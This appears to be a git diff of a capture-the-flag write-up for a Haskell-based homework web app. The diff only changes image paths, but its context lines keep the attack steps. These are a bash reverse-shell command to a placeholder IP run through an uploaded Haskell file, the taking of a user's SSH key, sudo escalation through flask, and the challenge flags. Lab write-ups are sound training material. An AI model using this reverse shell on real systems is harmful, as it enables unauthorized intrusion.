@@ -23,17 +23,17 @@ sticker: emoji//1f9d1-200d-1f4bb
 
 We can begin by visiting the web application:
 
-![](../images/Pasted%20image%2020250404151817.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404151817.png)
 
 
 If we go to the homework section, we can see the following:
 
 
-![](../images/Pasted%20image%2020250404152029.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404152029.png)
 
 We can go to the link and it will take us here:
 
-![](../images/Pasted%20image%2020250404152050.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404152050.png)
 
 If we fuzz, we can find the submit directory in which we can upload a `haskell` file:
 
@@ -112,7 +112,7 @@ main = callCommand "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
 
 If we upload the file, and set up our listener, we can see the following:
 
-![](../images/Pasted%20image%2020250404152827.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404152827.png)
 
 There we go, we got our shell. Let's start privilege escalation.
 
@@ -144,7 +144,7 @@ flag{academic_dishonesty}
 
 We can grab the `id_rsa` from `prof` and log into ssh:
 
-![](../images/Pasted%20image%2020250404153210.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404153210.png)
 
 
 If we check our sudo privileges, we can notice this:
@@ -205,7 +205,7 @@ sudo /usr/bin/flask run
 
 We can see the following:
 
-![](../images/Pasted%20image%2020250404154306.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404154306.png)
 
 There we go, we got our root shell and can finally read `root.txt`:
 
@@ -214,5 +214,5 @@ bash-4.4# cat /root/root.txt
 flag{im_purely_functional}
 ```
 
-![](../images/Pasted%20image%2020250404154405.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250404154405.png)
 
